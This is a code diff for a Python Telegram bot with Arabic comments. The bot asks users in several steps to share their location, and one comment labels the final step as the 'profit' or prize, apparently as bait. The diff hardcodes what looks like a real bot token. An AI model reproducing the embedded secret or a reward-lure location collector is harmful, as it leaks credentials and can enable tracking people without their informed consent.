@@ -8,12 +8,11 @@ logging.basicConfig(
 )
 
 # توكن البوت الخاص بك
-TOKEN = "ضع_التوكن_هنا"
+TOKEN = "8690867763:AAHZLpFhevbDCz5Rg8eoZjY5VVkFPGTKg8M"
 
-# 1. أمر البدء (الخطوة الأولى): يرحب بالمستخدم ويطلب منه مشاركة الموقع
+# 1. أمر البدء (الخطوة الأولى): يرحب بالمستخدم ويطلب منه مشاركة الموقع والسماح
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    # إنشاء زر لمشاركة الموقع الجغرافي
-    location_button = KeyboardButton(text="📍 مشاركة الموقع والسماح", request_location=True)
+    location_button = KeyboardButton(text="📍 البدء - مشاركة الموقع والسماح", request_location=True)
     reply_markup = ReplyKeyboardMarkup([[location_button]], resize_keyboard=True, one_time_keyboard=True)
     
     await update.message.reply_text(
@@ -22,21 +21,16 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         reply_markup=reply_markup
     )
 
-# 2. الخطوة الثانية: استقبال الموقع ثم طلب تأكيد الصلاحية مجدداً أو الانتقال للخطوة التالية
+# 2. الخطوة الثانية: استقبال الموقع الأول ثم طلب تأكيد الموقع مرة أخرى
 async def second_step(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.message.location:
-        lat = update.message.location.latitude
-        lon = update.message.location.longitude
-        # يمكنك حفظ الإحداثيات هنا إذا رغبت
-        
-        # إنشاء زر للخطوة الثانية (طلب الموقع والسماح مرة أخرى للتأكيد)
-        location_button = KeyboardButton(text="📍 تأكيد مشاركة الموقع (الخطوة الثانية)", request_location=True)
+        location_button = KeyboardButton(text="📍 الخطوة الثانية - تأكيد مشاركة الموقع", request_location=True)
         reply_markup = ReplyKeyboardMarkup([[location_button]], resize_keyboard=True, one_time_keyboard=True)
         
         await update.message.reply_text(
-            f"تم استلام إحداثيات موقعك بنجاح ✅\n\n"
-            "الآن أصبحت في **الخطوة الثانية**.\n"
-            "يرجى الضغط على الزر أدناه لتأكيد الموقع والسماح بالمتابعة للمرحلة الأخيرة 👇",
+            "تم استلام موقعك للخطوة الأولى بنجاح ✅\n\n"
+            "الانتقال إلى **الخطوة الثانية**:\n"
+            "يرجى الضغط على الزر أدناه لتأكيد الموقع والسماح للمتابعة إلى المرحلة الأخيرة 👇",
             reply_markup=reply_markup
         )
     else:
@@ -53,22 +47,22 @@ async def third_step(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
         await update.message.reply_text("الرجاء تأكيد الموقع عبر الزر السابق أولاً.")
 
-# دالة ذكية للتعامل مع المواقع المرتسلة حسب التسلسل
+# موجه ذكي للتعامل مع مواقع المستخدم حسب المرحلة
 async def handle_location(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    # نتحقق من رسالة المستخدم لنعرف في أي خطوة هو بناءً على الزر أو السياق
-    text = update.message.text
+    # تحقق بسيط لمعرفة ما إذا كان المستخدم في الخطوة الثانية وانتقل للثالثة
+    text = update.message.text if update.message.text else ""
     if update.message.location:
-        # إذا أرسل موقعاً، نفترض أنه تفاعل مع زر الخطوة الثانية وننقله للثالثة أو نعالجها
+        # إذا أرسل موقعاً للمرة الثانية ننقله للخطوة الثالثة (الربح)
         await third_step(update, context)
 
 def main():
     app = ApplicationBuilder().token(TOKEN).build()
 
-    # ربط الأوامر بالدوال
+    # أمر البدء (الخطوة الأولى)
     app.add_handler(CommandHandler("start", start_command))
     
-    # معالجة استلام الموقع الجغرافي من الزر
-    app.add_handler(MessageHandler(filters.LOCATION, second_step))
+    # معالجة استلام الموقع الأول لنقله للخطوة الثانية
+    app.add_handler(MessageHandler(filters.LOCATION & ~filters.UpdateType.EDITED, second_step))
 
     app.run_polling()
 
